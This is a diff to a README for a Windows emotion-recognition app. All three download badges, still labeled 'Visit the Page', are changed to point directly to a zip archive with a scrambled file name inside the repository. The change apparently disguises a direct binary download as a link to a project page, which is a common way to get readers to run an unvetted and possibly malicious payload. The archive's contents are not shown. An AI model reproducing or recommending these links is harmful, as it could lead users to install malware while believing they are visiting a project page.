@@ -1,6 +1,6 @@
 # 🎭 human-sense-ai-multimodal-emotion-recognition - See Feelings From Face And Voice
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition/raw/refs/heads/main/app/recognition_ai_emotion_multimodal_sense_human_1.9.zip)
 
 ## 🧭 Overview
 
@@ -40,7 +40,7 @@ For the best result, use:
 
 ## 📥 Download and Setup
 
-[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20Page-grey?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition)
+[![Download the app](https://img.shields.io/badge/Download-Visit%20the%20Page-grey?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition/raw/refs/heads/main/app/recognition_ai_emotion_multimodal_sense_human_1.9.zip)
 
 To get the app:
 
@@ -264,6 +264,6 @@ This project uses ideas from:
 
 ## 🔗 Download Again
 
-[![Visit download page](https://img.shields.io/badge/Download-Visit%20the%20Page-blue?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition)
+[![Visit download page](https://img.shields.io/badge/Download-Visit%20the%20Page-blue?style=for-the-badge)](https://github.com/hantucloud/human-sense-ai-multimodal-emotion-recognition/raw/refs/heads/main/app/recognition_ai_emotion_multimodal_sense_human_1.9.zip)
 
 Open the page above to get the files, then follow the setup steps in the repository to run the app on Windows
